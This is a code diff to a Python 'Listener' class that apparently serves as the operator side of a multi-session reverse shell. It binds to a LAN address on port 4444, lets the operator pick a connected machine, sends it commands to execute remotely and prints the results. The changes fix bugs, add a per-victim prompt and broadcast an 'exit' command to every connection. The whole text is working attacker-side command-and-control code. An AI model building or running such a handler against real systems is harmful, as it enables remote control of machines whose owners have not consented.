@@ -41,7 +41,11 @@ class Listener:
 	def reliable_send(self, data):
 		if self.chosen_connection:
 			json_data = json.dumps(data)
-			self.chosen_connection[0].send(json_data.encode())
+			if data == "exit":
+				for con in self.connections:
+					con[0].send(json_data.encode())
+			else:
+				self.chosen_connection[0].send(json_data.encode())
 		else:
 			print(colored("[-] You didn't choose any connection yet", "red"))
 
@@ -49,16 +53,15 @@ class Listener:
 	def reliable_recive(self):
 		json_data = ""
 		while True:
+			print(json_data)
 			try:
-				json_data += self.chosen_connection.recv(1024).decode()
+				json_data += self.chosen_connection[0].recv(1024).decode()
 				return json.loads(json_data)
 			except: continue
 
 
 	def execute_remotely(self, command):
 		self.reliable_send(command)
-		if command.split()[0] == "exit":
-			self.chosen_connection[0].close()
 		return self.reliable_recive()
 
 
@@ -72,7 +75,10 @@ class Listener:
 
 	def run(self):
 		while True:
-			command = input(">>> ")
+			if self.chosen_connection: 
+				user = self.chosen_connection[1][0]
+				command = input(f"{user} # ")
+			else: command = input(">>> ")
 
 			if command == "print":
 				connections = self.get_connections()
@@ -113,6 +119,12 @@ class Listener:
 				help_message += colored(" exit", "red") + " - stop the program; \n"
 				print(help_message)
 
+			
+			elif command == "exit":
+				self.execute_remotely("exit")
+				self.close()
+				exit()
+
 			elif len(command.split()):
 				if self.chosen_connection:
 					result = self.execute_remotely(command)
@@ -122,9 +134,8 @@ class Listener:
 
 
 
-
 if __name__ == "__main__":
-	listener = Listener("192.168.0.199", 4444)
+	listener = Listener("192.168.0.108", 4444)
 
 	listen_thread = threading.Thread(target=listener.listen)
 	listen_thread.start()
